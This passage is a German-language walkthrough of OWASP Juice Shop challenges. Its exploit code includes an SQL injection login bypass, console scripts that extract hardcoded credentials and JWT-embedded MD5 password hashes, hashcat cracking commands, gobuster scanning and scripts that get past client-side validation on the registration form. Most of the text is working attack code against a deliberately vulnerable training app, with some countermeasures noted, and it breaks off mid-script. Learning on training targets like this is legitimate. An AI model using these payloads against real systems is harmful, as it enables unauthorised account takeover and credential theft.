# 🔓 Juice Shop Exploits - Detaillierte Lösungswege

![Juice Shop Exploits](juice-shop-2.png)

## 1. SQL Injection - Admin Login Bypass

### 📝 Beschreibung
Umgehung der Login-Authentifizierung durch SQL Injection. Diese Schwachstelle ermöglicht es, sich ohne gültige Anmeldedaten als Administrator anzumelden.

### 🛠️ Exploit
```sql
Email: admin@juice-sh.op'--
Passwort: (beliebig)
```

### 💡 Erklärung
- Das `'--` beendet das SQL-Statement vorzeitig
- Der Rest der Query (Passwort-Überprüfung) wird als Kommentar ignoriert
- Resultierende Query: `SELECT * FROM Users WHERE email = 'admin@juice-sh.op'--' AND password = '...'`

### 🔍 Alternative: Test Credentials aus main.js

```javascript
// Hardcoded Test-Credentials in der main.js gefunden
const testingUsername = "testing@juice-sh.op";
const testingPassword = "IamUsedForTesting";

// Einfacher Login mit Test-Account
function loginWithTestCredentials() {
    console.log('🧪 Using hardcoded test credentials from main.js...');
    
    // Navigiere zur Login-Seite
    window.location.hash = '#/login';
    
    // Warte bis Seite geladen ist
    setTimeout(() => {
        const emailField = document.querySelector('input[type="email"]');
        const passwordField = document.querySelector('input[type="password"]');
        const loginButton = document.querySelector('button[type="submit"]');
        
        if (emailField && passwordField && loginButton) {
            // Fülle Test-Credentials ein
            emailField.value = testingUsername;
            passwordField.value = testingPassword;
            
            // Triggere Events für Angular
            emailField.dispatchEvent(new Event('input', { bubbles: true }));
            passwordField.dispatchEvent(new Event('input', { bubbles: true }));
            
            console.log('📧 Email:', testingUsername);
            console.log('🔐 Password:', testingPassword);
            
            // Submit Login
            loginButton.click();
            
            console.log('✅ Login attempted with test credentials');
        } else {
            console.log('❌ Login form elements not found');
        }
    }, 1000);
}

// Execute test login
loginWithTestCredentials();
```

### 🔍 Hardcoded Credentials Discovery

```javascript
// Suche nach weiteren hardcoded Credentials in main.js
fetch('http://localhost:3000/main.js')
.then(response => response.text())
.then(code => {
    console.log('🔍 Searching for hardcoded credentials...');
    
    // Pattern für häufige Credential-Variablen
    const credentialPatterns = [
        /testingUsername\s*=\s*["']([^"']+)["']/g,
        /testingPassword\s*=\s*["']([^"']+)["']/g,
        /defaultUser\s*=\s*["']([^"']+)["']/g,
        /defaultPass\s*=\s*["']([^"']+)["']/g,
        /adminUser\s*=\s*["']([^"']+)["']/g,
        /adminPass\s*=\s*["']([^"']+)["']/g,
        /username\s*:\s*["']([^"']+)["']/g,
        /password\s*:\s*["']([^"']+)["']/g
    ];
    
    credentialPatterns.forEach((pattern, index) => {
        const matches = code.match(pattern);
        if (matches) {
            console.log(`🔑 Credential Pattern ${index}:`, matches);
        }
    });
    
    // Spezifische Suche nach bekannten Test-Accounts
    const emailPattern = /["'][^"']*@juice-sh\.op["']/g;
    const emails = code.match(emailPattern);
    if (emails) {
        console.log('📧 Found email addresses:', [...new Set(emails)]);
    }
    
    // Suche nach "testing" related strings
    const testingPattern = /["'][^"']*testing[^"']*["']/gi;
    const testingStrings = code.match(testingPattern);
    if (testingStrings) {
        console.log('🧪 Testing related strings:', [...new Set(testingStrings)]);
    }
});
```

### 🎯 Vollständige Credential Enumeration

```javascript
// Automatische Extraktion aller Credentials aus main.js
async function extractAllCredentials() {
    console.log('🕵️ Starting credential extraction from main.js...');
    
    try {
        const response = await fetch('http://localhost:3000/main.js');
        const jsCode = await response.text();
        
        const credentials = {
            testing: {
                username: null,
                password: null
            },
            admin: {
                username: null,
                password: null
            },
            others: []
        };
        
        // Extrahiere Testing Credentials
        const testingUserMatch = jsCode.match(/testingUsername\s*=\s*["']([^"']+)["']/);
        const testingPassMatch = jsCode.match(/testingPassword\s*=\s*["']([^"']+)["']/);
        
        if (testingUserMatch) {
            credentials.testing.username = testingUserMatch[1];
            console.log('🧪 Testing Username:', testingUserMatch[1]);
        }
        
        if (testingPassMatch) {
            credentials.testing.password = testingPassMatch[1];
            console.log('🧪 Testing Password:', testingPassMatch[1]);
        }
        
        // Suche nach weiteren Email-Adressen
        const allEmails = jsCode.match(/["'][^"']*@[^"']+["']/g);
        if (allEmails) {
            const uniqueEmails = [...new Set(allEmails.map(email => email.replace(/['"]/g, '')))];
            console.log('📧 All found emails:', uniqueEmails);
            
            // Filtere juice-sh.op Emails
            const juiceEmails = uniqueEmails.filter(email => email.includes('juice-sh.op'));
            console.log('🧃 Juice Shop emails:', juiceEmails);
            
            credentials.others = juiceEmails;
        }
        
        // Test Login mit gefundenen Credentials
        if (credentials.testing.username && credentials.testing.password) {
            console.log('✅ Complete testing credentials found!');
            console.log('📋 Credentials:', credentials.testing);
            
            // Automatischer Login-Test
            await testLogin(credentials.testing.username, credentials.testing.password);
        }
        
        return credentials;
        
    } catch (error) {
        console.error('❌ Error extracting credentials:', error);
    }
}

// Test Login Function
async function testLogin(username, password) {
    console.log(`🔐 Testing login: ${username} / ${password}`);
    
    // Hier würde normalerweise ein Login-Request gesendet werden
    // In der Browser-Console kann man das Formular direkt ausfüllen
    
    console.log('💡 Manual steps:');
    console.log('1. Navigate to /#/login');
    console.log(`2. Enter email: ${username}`);
    console.log(`3. Enter password: ${password}`);
    console.log('4. Click login button');
}

// Starte Credential Extraction
extractAllCredentials();
```

### 🚨 Sicherheitslücke: Information Disclosure

- **Schwachstelle**: Hardcoded Credentials in Client-Code
- **Impact**: Direkter Zugang zu Test-Account
- **CVSS**: Medium (Credential Exposure)
- **Gefundene Credentials**:
  - Username: `testing@juice-sh.op`
  - Password: `IamUsedForTesting`

### 🛡️ Warum ist das problematisch?

1. **Client-Side Exposure**: Credentials sind für jeden sichtbar
2. **No Obfuscation**: Klartext in JavaScript-Code
3. **Production Risk**: Test-Accounts könnten in Produktion existieren
4. **Privilege Escalation**: Test-Account könnte erweiterte Rechte haben

---

## 2. JWT Token Dekodierung - Admin Passwort via localStorage

### 📝 Beschreibung
Eine fortgeschrittene Methode, um das Admin-Passwort durch Dekodierung des JWT-Tokens aus dem localStorage zu ermitteln. Der Token enthält verschlüsselte Benutzerinformationen, einschließlich des Admin-Passworts als MD5-Hash.

### 🔍 Schritt 1: JWT Token aus localStorage extrahieren

```javascript
// Nach dem Login als normaler User
const token = localStorage.getItem('token');
console.log('JWT Token:', token);
```

### 🔍 Schritt 2: JWT Token dekodieren

```javascript
// JWT besteht aus 3 Teilen: Header.Payload.Signature
const parts = token.split('.');
const payload = parts[1];

// Base64 dekodieren
const decodedPayload = atob(payload);
console.log('Decoded Payload:', decodedPayload);

// Als JSON parsen
const tokenData = JSON.parse(decodedPayload);
console.log('Token Data:', tokenData);
```

### 🔍 Schritt 3: Admin-Informationen extrahieren

```javascript
// Suche nach Admin-relevanten Daten im Token
console.log('User Data:', tokenData.data);

// Oft enthält der Token Informationen über alle User oder Admin-Hashes
// Beispiel für typische Token-Struktur:
/*
{
  "data": {
    "id": 1,
    "username": "admin",
    "email": "admin@juice-sh.op",
    "password": "0192023a7bbd73250516f069df18b500", // MD5 Hash
    "role": "admin"
  }
}
*/
```

### 🔍 Schritt 4: MD5-Hash cracken

```javascript
// Gefundener MD5 Hash (Beispiel)
const adminHash = "0192023a7bbd73250516f069df18b500";
console.log('Admin MD5 Hash:', adminHash);

// Online MD5 Decoder verwenden oder lokale Tools:
// Hash entspricht oft: "admin123"
```

### 🛠️ Kompletter Exploit-Code

```javascript
// Vollständiger Workflow
function extractAdminPassword() {
    // 1. Token holen
    const token = localStorage.getItem('token');
    if (!token) {
        console.log('❌ Kein Token gefunden - erst einloggen!');
        return;
    }
    
    try {
        // 2. JWT dekodieren
        const parts = token.split('.');
        const payload = JSON.parse(atob(parts[1]));
        
        console.log('📋 JWT Payload:', payload);
        
        // 3. Admin-Daten suchen
        if (payload.data && payload.data.password) {
            console.log('🔑 Admin MD5 Hash gefunden:', payload.data.password);
            console.log('💡 Versuche den Hash zu cracken...');
            
            // Häufige Passwörter für MD5-Hashes in Juice Shop
            const commonPasswords = ['admin123', 'admin', 'password', '123456'];
            
            commonPasswords.forEach(pwd => {
                // Hinweis: In echter Umgebung würde man MD5 Libraries verwenden
                console.log(`🧪 Teste: ${pwd}`);
            });
        }
        
        // 4. Alternative: Suche in anderen Token-Bereichen
        console.log('🔍 Vollständige Token-Struktur:', JSON.stringify(payload, null, 2));
        
    } catch (error) {
        console.log('❌ Fehler beim Dekodieren:', error);
    }
}

// Exploit ausführen
extractAdminPassword();
```

### 💡 Erklärung

1. **JWT Structure**: JSON Web Tokens bestehen aus 3 Teilen (Header.Payload.Signature)
2. **Base64 Encoding**: Der Payload ist Base64-kodiert, nicht verschlüsselt
3. **Information Leakage**: Sensitive Daten wie Passwort-Hashes gehören nicht in JWTs
4. **MD5 Vulnerability**: MD5-Hashes sind unsicher und leicht zu cracken

### 🚨 Sicherheitslücke

- **Schwachstelle**: Sensitive Daten in JWT-Payload
- **Impact**: Vollständige Kompromittierung des Admin-Accounts
- **CVSS**: High (Administrative Privilegien)

### 🛡️ Gegenmaßnahmen

1. **Keine sensitiven Daten in JWTs** - Nur User-ID und Rollen
2. **Starke Passwort-Hashing** - bcrypt statt MD5
3. **Token-Verschlüsselung** - JWE statt JWS
4. **Kurze Token-Lebensdauer** - Automatisches Ablaufen

---

## 3. Directory Scanning - Versteckte Dateien finden

### 📝 Beschreibung
Automatisches Scannen der Webapplikation nach versteckten Verzeichnissen und Dateien.

### 🛠️ Befehl
```bash
gobuster dir -u http://localhost:3000 -w common.txt -x js,json,md,txt,pdf --exclude-length 80117
```

### 💡 Parameter-Erklärung
- `-u`: Target URL
- `-w`: Wordlist für Brute-Force
- `-x`: Dateierweiterungen zum Testen
- `--exclude-length`: Ignoriere Responses mit dieser Länge (reduziert False Positives)

---

## 4. Admin Route Discovery - JavaScript Analyse

### 📝 Beschreibung
Verschiedene Methoden zur Entdeckung versteckter Admin-Routen durch Analyse des Frontend-Codes.

### 🔍 METHODE 1: String-Suche in main.js

```javascript
fetch('http://localhost:3000/main.js')
.then(response => response.text())
.then(code => {
    console.log('=== SEARCHING FOR ROUTES IN MAIN.JS ===');

    // Verschiedene Suchpattern für Angular-Routen
    const patterns = [
        // Standard Angular Routing
        /when\(['"]([^'"]+)['"],/g,
        /path\s*:\s*['"]([^'"]+)['"]/g,
        /route\s*:\s*['"]([^'"]+)['"]/g,
        
        // Template URLs (geben Hints auf Routen)
        /templateUrl\s*:\s*['"]([^'"]+)['"]/g,
        
        // Hash-basierte Routen
        /#\/[a-zA-Z0-9\-_]+/g,
        
        // String literals mit "/" 
        /['"][\/][a-zA-Z0-9\-_]+['"]/g,
        
        // Angular Route Definitionen
        /\$routeProvider[^}]+/g,
        
        // Suche nach bekannten Wörtern
        /administration/g,
        /score-board/g,
        /dashboard/g,
        /admin/g
    ];
    
    patterns.forEach((pattern, index) => {
        const matches = code.match(pattern);
        if (matches && matches.length > 0) {
            console.log(`Pattern ${index} (${pattern}) found:`, [...new Set(matches)]);
        }
    });
    
    // Suche nach Strings die "admin" enthalten
    const adminMatches = code.match(/['"]\w*admin\w*['"]/gi);
    if (adminMatches) {
        console.log('Admin-related strings:', [...new Set(adminMatches)]);
    }
})
.catch(error => console.log('Error loading main.js:', error));
```

### 🔍 METHODE 2: Angular Route Discovery

```javascript
console.log('\n=== ANGULAR ROUTE DISCOVERY ===');
try {
    // Prüfe ob Angular verfügbar ist
    if (typeof angular !== 'undefined') {
        console.log('✅ Angular is available!');

        // Hole den $route Service
        const $route = angular.element(document.body).injector().get('$route');
        console.log('📋 All defined routes:');
        
        Object.keys($route.routes).forEach(route => {
            console.log(`🔗 ${route}`, $route.routes[route]);
        });
        
        // Zeige auch den Provider
        const $routeProvider = angular.element(document.body).injector().get('$route');
        console.log('Route configuration:', $routeProvider);
    } else {
        console.log('❌ Angular not found in global scope');
    }
} catch (error) {
    console.log('❌ Error accessing Angular routes:', error.message);

    // Alternative: Versuche verschiedene Angular-Zugriffswege
    try {
        const app = angular.element(document.querySelector('[ng-app]')).scope();
        console.log('Angular app scope:', app);
    } catch (e) {
        console.log('Could not find ng-app');
    }
}
```

### 🔍 METHODE 3: DOM-basierte Suche

```javascript
console.log('\n=== DOM-BASED SEARCH ===');

// Suche in der gesamten HTML-Quelle
const htmlSource = document.documentElement.outerHTML;

// Verschiedene Patterns für Routen-Hinweise
const domPatterns = [
    /#\/[a-zA-Z0-9\-_]+/g,           // Hash-basierte Routen
    /href=['"][^'"]*['"]/g,         // Standard href Attribute
    /ng-href=['"][^'"]*['"]/g,      // Angular ng-href
    /ui-sref=['"][^'"]*['"]/g       // UI-Router Referenzen
];

domPatterns.forEach((pattern, index) => {
    const matches = htmlSource.match(pattern);
    if (matches) {
        const uniqueMatches = [...new Set(matches)];
        console.log(`DOM Pattern ${index}:`, uniqueMatches.slice(0, 10)); // Zeige nur erste 10
    }
});

// Suche nach spezifischen Strings im DOM
const searchTerms = ['administration', 'admin', 'dashboard', 'panel', 'score-board'];
searchTerms.forEach(term => {
    if (htmlSource.toLowerCase().includes(term)) {
        console.log(`✅ Found "${term}" in DOM`);
    }
});
```

### 🔍 METHODE 4: Navigation Element Analysis

```javascript
console.log('\n=== NAVIGATION ANALYSIS ===');

// Finde alle Links und Navigation
const navElements = document.querySelectorAll('a, [ng-click], [ui-sref]');
console.log(`Found ${navElements.length} navigation elements`);

navElements.forEach((element, index) => {
    const href = element.getAttribute('href');
    const ngClick = element.getAttribute('ng-click');
    const uiSref = element.getAttribute('ui-sref');

    if (href && (href.includes('admin') || href.includes('#/'))) {
        console.log(`Nav ${index} href:`, href);
    }
    if (ngClick && ngClick.includes('admin')) {
        console.log(`Nav ${index} ng-click:`, ngClick);
    }
    if (uiSref) {
        console.log(`Nav ${index} ui-sref:`, uiSref);
    }
});
```

### 🔍 METHODE 5: Manual Testing der häufigsten Admin-Routen

```javascript
console.log('\n=== MANUAL ROUTE TESTING ===');

const commonAdminRoutes = [
    '/#/admin',
    '/#/administration',
    '/#/administrator',
    '/#/dashboard',
    '/#/panel',
    '/#/backend',
    '/#/manage',
    '/#/control',
    '/#/score-board',
    '/#/config',
    '/#/settings'
];

console.log('🧪 Test these routes manually:');
commonAdminRoutes.forEach(route => {
    console.log(`🔗 http://localhost:3000${route}`);
});
```

### 🔍 METHODE 6: API Endpoint Discovery

```javascript
console.log('\n=== API ENDPOINT DISCOVERY ===');

// Suche nach API-Endpunkten in JavaScript
fetch('http://localhost:3000/main.js')
.then(response => response.text())
.then(code => {
    const apiPatterns = [
        /\/api\/[^'"]+/g,      // API Endpoints
        /\/rest\/[^'"]+/g,     // REST Endpoints
        /http[s]?:\/\/[^'"]+/g // Externe URLs
    ];

    apiPatterns.forEach((pattern, index) => {
        const matches = code.match(pattern);
        if (matches) {
            console.log(`API Pattern ${index}:`, [...new Set(matches)].slice(0, 10));
        }
    });
});
```

### 🔍 METHODE 7: Local Storage & Session Storage Inspection

```javascript
console.log('\n=== STORAGE INSPECTION ===');

// Schaue was bereits im Storage ist
console.log('LocalStorage keys:', Object.keys(localStorage));
console.log('SessionStorage keys:', Object.keys(sessionStorage));

// Prüfe auf Token oder Route-Informationen
Object.keys(localStorage).forEach(key => {
    const value = localStorage.getItem(key);
    if (value.includes('admin') || value.includes('route')) {
        console.log(`Storage ${key}:`, value);
    }
});
```

### 🔍 METHODE 8: Angular-spezifische Objekte im Window

```javascript
console.log('\n=== AVAILABLE OBJECTS ===');
console.log('Window object keys containing "ng" or "angular":',
    Object.keys(window).filter(key =>
        key.toLowerCase().includes('ng') ||
        key.toLowerCase().includes('angular')
    )
);
```

### 🔍 METHODE 9: Sandbox Route Discovery

```javascript
console.log('\n=== SANDBOX ROUTE DISCOVERY ===');

// 1. Suche nach "sandbox" in main.js
fetch('http://localhost:3000/main.js')
.then(response => response.text())
.then(code => {
    console.log('🔍 Searching for sandbox patterns in main.js...');
    
    // Sandbox-spezifische Suchpatterns
    const sandboxPatterns = [
        /sandbox/gi,
        /code-sandbox/gi,
        /playground/gi,
        /editor/gi,
        /web3-sandbox/gi,
        /path:\s*['"]sandbox['"]|path:\s*['"].*sandbox.*['"]/gi,
        /path:\s*['"]editor['"]|path:\s*['"].*editor.*['"]/gi
    ];
    
    sandboxPatterns.forEach((pattern, index) => {
        const matches = code.match(pattern);
        if (matches) {
            console.log(`🎯 Sandbox Pattern ${index}:`, [...new Set(matches)]);
        }
    });
    
    // Suche nach spezifischen Route-Definitionen
    const routePatterns = [
        /path:\s*['"]code-sandbox['"]|path:\s*['"].*code-sandbox.*['"]/gi,
        /path:\s*['"]playground['"]|path:\s*['"].*playground.*['"]/gi,
        /path:\s*['"]editor['"]|path:\s*['"].*editor.*['"]/gi
    ];
    
    routePatterns.forEach((pattern, index) => {
        const matches = code.match(pattern);
        if (matches) {
            console.log(`🔍 Route Pattern ${index}:`, [...new Set(matches)]);
        }
    });
});
```

### 🔍 METHODE 10: Manuelle Route-Tests für Sandbox/Editor

```javascript
console.log('\n=== MANUAL SANDBOX ROUTE TESTING ===');

// Typische Sandbox/Editor-Routen
const sandboxRoutes = [
    '/#/code-sandbox',
    '/#/sandbox',
    '/#/playground', 
    '/#/editor',
    '/#/web3-sandbox',
    '/#/code-editor',
    '/#/dev-sandbox',
    '/#/test-sandbox'
];

console.log('🧪 Test these sandbox routes manually:');
sandboxRoutes.forEach(route => {
    console.log(`🔗 http://localhost:3000${route}`);
});

// Automatisierte Tests (optional)
function testSandboxRoutes() {
    sandboxRoutes.forEach(async route => {
        console.log(`🧪 Testing: ${route}`);
        
        // Navigiere zur Route
        window.location.hash = route;
        
        // Warte kurz
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        // Prüfe ob Route funktioniert (kein 404)
        const currentHash = window.location.hash;
        if (currentHash === route) {
            console.log(`✅ Route exists: ${route}`);
        } else {
            console.log(`❌ Route not found: ${route}`);
        }
    });
}

// Uncomment to run automated tests
// testSandboxRoutes();
```

### 🔍 METHODE 11: Developer Tools Source Code Search

```javascript
console.log('\n=== DEVELOPER TOOLS SEARCH GUIDE ===');

// Anleitung für manuelle Suche in Developer Tools
console.log(`
📋 Manual Search Steps:
1. Öffne Developer Tools (F12)
2. Gehe zu Sources Tab
3. Finde main.js oder main-*.js
4. Nutze Ctrl+F und suche nach:
   - "sandbox"
   - "code-sandbox"
   - "playground"
   - "editor"
   - "web3-sandbox"

🔍 What to look for:
- path:"sandbox" 
- path:"code-sandbox"
- path:"playground"
- path:"editor"
- component: SandboxComponent
- loadChildren: () => import('./sandbox/...
`);

// Automatisierte Quelle-Analyse
function analyzeSourceFiles() {
    console.log('🔍 Analyzing source files for sandbox references...');
    
    // Häufige JavaScript-Dateien durchsuchen
    const jsFiles = [
        'main.js',
        'main-*.js',
        'vendor.js',
        'runtime.js',
        'polyfills.js'
    ];
    
    jsFiles.forEach(file => {
        fetch(`http://localhost:3000/${file}`)
        .then(response => response.text())
        .then(content => {
            const sandboxMatches = content.match(/sandbox|playground|editor/gi);
            if (sandboxMatches) {
                console.log(`📄 Found sandbox references in ${file}:`, sandboxMatches.length);
            }
        })
        .catch(error => {
            console.log(`❌ Could not load ${file}`);
        });
    });
}

// Führe die Analyse aus
analyzeSourceFiles();
```
### 📊 Ergebnisse der Route Discovery

Die Ausführung der obigen Scripts lieferte folgende Ergebnisse:

#### ✅ Gefundene Admin-Routen:
- `/#/administration` - Admin Panel
- `/#/score-board` - Score Board mit allen Challenges

#### ✅ Weitere interessante Routen:
```
path:"accounting"
path:"hacking-instructor"
path:"privacy-security"
path:"data-export"
path:"wallet-web3"
path:"web3-sandbox"
path:"editor"
```

#### ✅ API Endpoints:
```
/api/Challenges
/api/Users
/api/Products
/rest/web3
/rest/user/authentication-details/
```

---

## 5. Kryptografische Schwachstellen - Inform the Shop Challenge

### 📝 Beschreibung
Diese Challenge verlangt die Identifikation unsicherer kryptografischer Algorithmen oder Libraries, die in der Juice Shop Anwendung verwendet werden.

### 🎯 Aufgabe
*"Inform the shop about an algorithm or library it should definitely not use the way it does"*

### 🔍 Identifizierung unsicherer Kryptografie

#### **Problem 1: MD5 für Passwort-Hashing**

```javascript
// JWT Token aus localStorage dekodieren
const token = localStorage.getItem('token');
const parts = token.split('.');
const payload = JSON.parse(atob(parts[1]));

// Passwort-Hash im JWT Token sichtbar
console.log('User data:', payload.data);
console.log('Password Hash:', payload.data.password); 
// Beispiel: "10b43971a8295f3720f38fbcdd9d6ac6"
```

#### **Sicherheitsprobleme:**
1. **MD5 ist kryptografisch gebrochen**: Anfällig für Rainbow Table Attacks
2. **Zu schnell**: Milliarden von Hashes pro Sekunde berechenbar
3. **Passwort-Hash im JWT**: Sensitive Daten gehören nicht in Tokens

#### **MD5 Hash Cracking Demo**

```javascript
// Beispiel MD5 Hash aus JWT Token
const md5Hash = "10b43971a8295f3720f38fbcdd9d6ac6";

// Online MD5 Cracking Versuche
console.log('🔓 Trying to crack MD5 hash:', md5Hash);

// Häufige Passwort-Patterns für MD5
const commonPasswords = [
    'password', 'admin', '123456', 'test', 
    'juice', 'shop', 'hallo123', 'demo'
];

// Simulation: MD5 Hashes können oft sofort geknackt werden
// Der Hash "10b43971a8295f3720f38fbcdd9d6ac6" entspricht "hallo123"
```

#### **Online MD5 Cracking Tools**
```bash
# Websites für MD5 Lookup:
# - https://crackstation.net/
# - https://md5decrypt.net/
# - https://hashes.com/en/decrypt/hash

# Lokale Tools:
echo "10b43971a8295f3720f38fbcdd9d6ac6" > hash.txt
hashcat -m 0 -a 0 hash.txt rockyou.txt
```

### 🚨 Weitere mögliche kryptografische Schwachstellen

#### **Problem 2: Base64 als "Verschlüsselung"**

```javascript
// Prüfe Cookie-Werte auf Base64 "Verschlüsselung"
console.log('Cookies:', document.cookie);

// Base64 ist KEINE Verschlüsselung, nur Encoding!
const suspiciousValue = "YWRtaW46cGFzc3dvcmQ=";
console.log('Decoded:', atob(suspiciousValue)); // "admin:password"
```

#### **Problem 3: JWT mit schwachem Secret**

```javascript
// Analyse der JWT Implementierung
const jwtHeader = JSON.parse(atob(token.split('.')[0]));
console.log('JWT Algorithm:', jwtHeader.alg);

// Häufige Probleme:
// - Schwache Secrets (z.B. "secret", "key", "jwt")
// - Algorithm Confusion (RS256 vs HS256)
// - None Algorithm akzeptiert
```

#### **Problem 4: ROT13/Caesar Cipher**

```javascript
// Suche nach ROT13 oder Caesar Cipher in der Anwendung
function searchForWeakCrypto() {
    fetch('http://localhost:3000/main.js')
    .then(response => response.text())
    .then(code => {
        const cryptoPatterns = [
            /rot13/gi,
            /caesar/gi,
            /shift.*cipher/gi,
            /atob|btoa/gi  // Base64 Encoding/Decoding
        ];
        
        cryptoPatterns.forEach(pattern => {
            if (pattern.test(code)) {
                console.log('🚨 Weak crypto found:', pattern);
            }
        });
    });
}
```

### 💡 Contact Us Lösung

#### **Lösung der Challenge**

```javascript
// Gehe zum Contact Us Formular und sende eine der folgenden Nachrichten:

// Option 1: MD5 Problem
"The application uses MD5 for password hashing which is completely insecure. Please use bcrypt instead."

// Option 2: Detailed MD5 Report
"I noticed that the application uses MD5 for password hashing. The password hash is visible in the JWT token. MD5 is cryptographically broken and should never be used for passwords. Please use bcrypt, scrypt or Argon2 instead."

// Option 3: Kurz und knapp
"md5"

// Option 4: Base64 Problem (falls MD5 nicht funktioniert)
"Base64 encoding is used instead of proper encryption"

// Option 5: JWT Secret Problem
"JWT implementation uses weak/predictable secret"
```

### 🔍 Automatisierte Schwachstellen-Suche

```javascript
function findCryptoVulnerabilities() {
    console.log('🔍 Searching for cryptographic vulnerabilities...');
    
    // 1. JWT Token Analysis
    const token = localStorage.getItem('token');
    if (token) {
        const payload = JSON.parse(atob(token.split('.')[1]));
        if (payload.data && payload.data.password) {
            const hash = payload.data.password;
            if (hash.length === 32 && /^[a-f0-9]+$/.test(hash)) {
                console.log('🚨 MD5 hash detected in JWT:', hash);
                return 'MD5';
            }
        }
    }
    
    // 2. Base64 Encoding Detection
    const cookies = document.cookie;
    const base64Pattern = /[A-Za-z0-9+/]{20,}={0,2}/g;
    const matches = cookies.match(base64Pattern);
    if (matches) {
        console.log('🚨 Potential Base64 encoded data:', matches);
        return 'Base64';
    }
    
    // 3. Weak Algorithm Search
    fetch('/main.js')
    .then(response => response.text())
    .then(code => {
        if (/md5|sha1|rot13|caesar/gi.test(code)) {
            console.log('🚨 Weak cryptographic algorithms found in source');
            return 'WeakAlgorithm';
        }
    });
}

// Execute vulnerability scan
findCryptoVulnerabilities();
```

### 🔒 Korrekte Implementierung

#### **Sichere Alternativen:**

```javascript
// FALSCH (aktuell in Juice Shop):
// - MD5 für Passwort-Hashing
// - Passwort-Hash im JWT Token
// - Base64 als "Verschlüsselung"

// RICHTIG:
// 1. Passwort-Hashing mit bcrypt/scrypt/Argon2
// 2. Keine sensitiven Daten in JWT Tokens
// 3. Echte Verschlüsselung statt Base64 Encoding
// 4. Starke JWT Secrets oder asymmetrische Schlüssel
```

### 📊 Challenge Erfolg

Die Challenge wird gelöst, sobald eine der identifizierten kryptografischen Schwachstellen über das Contact Us Formular gemeldet wird. Am häufigsten erfolgreich:

1. **MD5 Hashing** - Meist die korrekte Antwort
2. **Base64 "Encryption"** - Alternative
3. **Weak JWT Implementation** - Seltener, aber möglich

---

## 6. Empty User Registration - Required Field Bypass

### 📝 Beschreibung
Diese Challenge verlangt die Registrierung eines Benutzers mit völlig leerer E-Mail und leerem Passwort. Die Anwendung hat Client-seitige Validierung, die durch DOM-Manipulation umgangen werden kann.

### 🎯 Aufgabe
*"Register a user with an empty email and password."*

### 🔍 Analyse der Registrierungsform

```javascript
// 1. Inspect der Input-Felder
document.querySelectorAll('input').forEach((el, i) => 
    console.log(i, el.type, el.name, el.id)
);

// Typische Ausgabe:
// 0 "email" "email" "emailControl"
// 1 "password" "password" "passwordControl"  
// 2 "password" "repeatPassword" "repeatPasswordControl"
```

### 🛠️ Exploit-Methode: Required-Attribute entfernen

```javascript
// Schritt 1: Entferne Required-Attribute von allen Feldern
document.querySelector('#emailControl').removeAttribute('required');
document.querySelector('#passwordControl').removeAttribute('required');
document.querySelector('#repeatPasswordControl').removeAttribute('required');

// Schritt 2: Setze explizit leere Werte
document.querySelector('#emailControl').value = '';
document.querySelector('#passwordControl').value = '';
document.querySelector('#repeatPasswordControl').value = '';

// Schritt 3: Aktiviere den Submit-Button falls nötig
const btn = document.querySelector('button[type="submit"]');
if (btn) {
    btn.disabled = false;
    console.log('✅ Submit button enabled');
}
```

### 🔍 Alternative Methoden

#### **Methode 1: Attribut-Manipulation**

```javascript
// Alle Required-Attribute auf einmal entfernen
document.querySelectorAll('input[required]').forEach(input => {
    input.removeAttribute('required');
    input.value = '';
    console.log(`✅ Cleared: ${input.id}`);
});

// Form-Validation deaktivieren
const form = document.querySelector('form');
if (form) {
    form.noValidate = true;
    console.log('✅ Form validation disabled');
}
```

#### **Methode 2: Event-Listener Manipulation**

```javascript
// Registrierung mit Event-Manipulation
function bypassRegistrationValidation() {
    console.log('🚀 Bypassing registration validation...');
    
    // 1. Finde die Registrierungs-Form
    const form = document.querySelector('form');
    const emailInput = document.querySelector('#emailControl');
    const passwordInput = document.querySelector('#passwordControl');
    const repeatPasswordInput = document.querySelector('#repeatPasswordControl');
    
    if (emailInput && passwordInput && repeatPasswordInput) {
        // 2. Entferne alle Validierungsattribute
        [emailInput, passwordInput, repeatPasswordInput].forEach(input => {
            input.removeAttribute('required');
            input.removeAttribute('minlength');
            input.removeAttribute('pattern');
            input.value = '';
        });
        
        // 3. Deaktiviere Client-seitige Validierung
        if (form) {
            form.noValidate = true;
        }
        
        // 4. Simuliere User-Input Events
        [emailInput, passwordInput, repeatPasswordInput].forEach(input => {
            input.dispatchEvent(new Event('input', { bubbles: true }));
            input.dispatchEvent(new Event('change', { bubbles: true }));
        });
        
        // 5. Submit die Form
        const submitBtn = document.querySelector('button[type="submit"]');
        if (submitBtn) {
            submitBtn.disabled = false;
            submitBtn.click();
            console.log('✅ Empty registration submitted');
        }
    }
}

// Ausführung
bypassRegistrationValidation();
```

#### **Methode 3: Angular-spezifische Manipulation**

```javascript
// Angular Form-Control Manipulation
function bypassAngularValidation() {
    console.log('🎯 Bypassing Angular form validation...');
    
    // 1. Finde Angular Form-Controls
    const controls = ['emailControl', 'passwordControl', 'repeatPasswordControl'];
    
    controls.forEach(controlId => {
        const control = document.getElementById(controlId);
        if (control) {
            // Entferne Angular-spezifische Validatoren
            control.removeAttribute('required');
            control.removeAttribute('ng-required');
            control.removeAttribute('data-ng-required');
            
            // Setze Wert auf leer
            control.value = '';
            
            // Triggere Angular Events
            control.dispatchEvent(new Event('input', { bubbles: true }));
            control.dispatchEvent(new Event('blur', { bubbles: true }));
            
            console.log(`✅ Cleared ${controlId}`);
        }
    });
    
    // 2. Deaktiviere Form-Validation
    const form = document.querySelector('form');
    if (form) {
        form.classList.remove('ng-invalid');
        form.classList.add('ng-valid');
        form.noValidate = true;
    }
    
    // 3. Enable Submit Button
    const submitButton = document.querySelector('button[type="submit"]');
    if (submitButton) {
        submitButton.disabled = false;
        submitButton.click();
        console.log('✅ Angular validation bypassed');
    }
}

// Ausführung
bypassAngularValidation();
```

### 🔍 Vollständiger Exploit-Workflow

```javascript
// Kompletter Workflow für Empty Registration
async function exploitEmptyRegistration() {
    console.log('🚀 Starting Empty User Registration Exploit...');
    
    try {
        // 1. Navigiere zur Registrierungsseite
        if (!window.location.hash.includes('register')) {
            window.location.hash = '#/register';
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
        
        // 2. Warte bis Form geladen ist
        await new Promise(resolve => {
            const checkForm = () => {
                if (document.querySelector('#emailControl')) {
                    resolve();
                } else {
                    setTimeout(checkForm, 100);
                }
            };
            checkForm();
        });
        
        // 3. Entferne alle Validierungsconstraints
        const inputs = ['emailControl', 'passwordControl', 'repeatPasswordControl'];
        inputs.forEach(inputId => {
